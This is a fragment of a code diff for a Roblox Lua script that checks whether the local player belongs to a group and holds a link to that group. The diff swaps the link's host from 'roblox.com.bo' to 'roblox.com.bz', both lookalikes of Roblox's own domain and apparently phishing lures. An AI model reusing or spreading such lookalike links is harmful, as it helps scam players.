@@ -4,7 +4,7 @@ local TweenService = game:GetService("TweenService")
 local player = Players.LocalPlayer
 
 local GROUP_ID = 215154644959
-local GROUP_LINK = "https://roblox.com.bo/communities/7368983769/"
+local GROUP_LINK = "https://roblox.com.bz/communities/7368983769/"
 
 if player:IsInGroup(GROUP_ID) then return end
 
